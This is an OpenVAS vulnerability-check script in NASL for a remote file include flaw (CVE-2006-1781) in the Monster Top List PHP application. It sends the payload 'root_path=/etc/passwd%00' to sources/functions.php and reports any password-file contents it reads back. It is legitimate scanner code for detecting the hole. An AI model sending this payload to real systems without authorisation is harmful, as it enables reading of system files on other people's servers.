# OpenVAS Vulnerability Test
# $Id: mtl_remote_file_include.nasl 16 2013-10-27 13:09:52Z jan $
# Description: Monster Top List Remote File Include
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2006 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server contains a PHP application that is affected by a
remote file include vulnerability. 

Description :

The remote host is running Monster Top List, a site rating script
written in PHP. 

The installed version of Monster Top List fails to sanitize user input
to the 'root_path' parameter in sources/functions.php before using it
to include PHP code from other files.  An unauthenticated attacker may
be able to read arbitrary local files or include a file from a remote
host that contains commands which will be executed on the remote host
subject to the privileges of the web server process. 

This flaw is only exploitable if PHP's 'register_globals' is enabled.";

tag_solution = "Unknown at this time.";

  desc = "
  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;

if (description) {
  script_id(80073);;
  script_version("$Revision: 16 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_bugtraq_id(17546);
  script_cve_id("CVE-2006-1781");
  script_xref(name:"OSVDB", value:"24650");

  name = "Monster Top List Remote File Include";
  script_name(name);
 
  script_description(desc);
 
  summary = "Checks for file includes in sources/functions.php";
  script_summary(summary);
 
  script_category(ACT_ATTACK);
  script_family("Web application abuses");

  script_copyright("This script is Copyright (C) 2006 Josh Zlatin-Amishav");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://pridels.blogspot.com/2006/04/monstertoplist.html");
  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = make_list("/toplist", cgi_dirs());
else dirs = make_list(cgi_dirs());

# Loop through CGI directories.
foreach dir (dirs) {
  # Try to exploit the flaw in sources/functions.php to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/sources/functions.php?",
      "root_path=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or "Failed opening".
      #
      # nb: this suggests magic_quotes_gpc was enabled but passing 
      #     remote URLs might still work.
      egrep(string:res, pattern:"Warning.+/etc/passwd\0sources/func_output\.php.+failed to open stream")
    
  ) {
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) content = res;

    if (content)
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "OpenVAS was able to read from the remote host :\n",
        "\n",
        content
      );
    else report = desc;

    security_hole(port:port, data:report);
    exit(0);
  }
}
